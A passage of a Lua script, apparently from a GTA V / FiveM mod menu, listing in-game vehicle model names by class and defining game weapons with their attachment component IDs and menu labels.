    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b6 = {
    'WEAPON_KNIFE',
    'WEAPON_KNUCKLE',
    'WEAPON_NIGHTSTICK',
    'WEAPON_HAMMER',
    'WEAPON_BAT',
    'WEAPON_GOLFCLUB',
    'WEAPON_CROWBAR',
    'WEAPON_BOTTLE',
    'WEAPON_DAGGER',
    'WEAPON_HATCHET',
    'WEAPON_MACHETE',
    'WEAPON_FLASHLIGHT',
    'WEAPON_SWITCHBLADE',
    'WEAPON_PISTOL',
    'WEAPON_PISTOL_MK2',
    'WEAPON_COMBATPISTOL',
    'WEAPON_APPISTOL',
    'WEAPON_PISTOL50',
    'WEAPON_SNSPISTOL',
    'WEAPON_HEAVYPISTOL',
    'WEAPON_VINTAGEPISTOL',
    'WEAPON_STUNGUN',
    'WEAPON_FLAREGUN',
    'WEAPON_MARKSMANPISTOL',
    'WEAPON_REVOLVER',
    'WEAPON_MICROSMG',
    'WEAPON_SMG',
    'WEAPON_SMG_MK2',
    'WEAPON_ASSAULTSMG',
    'WEAPON_MG',
    'WEAPON_COMBATMG',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_COMBATPDW',
    'WEAPON_GUSENBERG',
    'WEAPON_MACHINEPISTOL',
    'WEAPON_ASSAULTRIFLE',
    'WEAPON_ASSAULTRIFLE_MK2',
    'WEAPON_CARBINERIFLE',
    'WEAPON_CARBINERIFLE_MK2',
    'WEAPON_ADVANCEDRIFLE',
    'WEAPON_SPECIALCARBINE',
    'WEAPON_BULLPUPRIFLE',
    'WEAPON_COMPACTRIFLE',
    'WEAPON_PUMPSHOTGUN',
    'WEAPON_SAWNOFFSHOTGUN',
    'WEAPON_BULLPUPSHOTGUN',
    'WEAPON_ASSAULTSHOTGUN',
    'WEAPON_MUSKET',
    'WEAPON_HEAVYSHOTGUN',
    'WEAPON_DBSHOTGUN',
    'WEAPON_SNIPERRIFLE',
    'WEAPON_HEAVYSNIPER',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_MARKSMANRIFLE',
    'WEAPON_GRENADELAUNCHER',
    'WEAPON_GRENADELAUNCHER_SMOKE',
    'WEAPON_RPG',
    'WEAPON_STINGER',
    'WEAPON_FIREWORK',
    'WEAPON_HOMINGLAUNCHER',
    'WEAPON_GRENADE',
    'WEAPON_STICKYBOMB',
    'WEAPON_PROXMINE',
    'WEAPON_BZGAS',
    'WEAPON_SMOKEGRENADE',
    'WEAPON_MOLOTOV',
    'WEAPON_FIREEXTINGUISHER',
    'WEAPON_PETROLCAN',
    'WEAPON_SNOWBALL',
    'WEAPON_FLARE',
    'WEAPON_BALL'
}
local b7 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~b~-» ~w~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~b~-» ~w~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~b~-» ~w~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~b~-» ~w~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~b~-» ~w~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~b~-» ~w~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~b~-» ~w~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~b~-» ~w~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~b~-» ~w~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~b~-» ~w~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~b~-» ~w~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~b~-» ~w~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~b~-» ~w~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~b~-» ~w~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~b~-» ~w~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~b~-» ~w~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~b~-» ~w~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~b~-» ~w~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~b~-» ~w~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~b~-» ~w~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {
                        'Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~b~-» ~w~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~b~-» ~w~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~b~-» ~w~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~b~-» ~w~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~b~-» ~w~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~b~-» ~w~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~b~-» ~w~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~b~-» ~w~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~b~-» ~w~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~b~-» ~w~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~b~-» ~w~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {
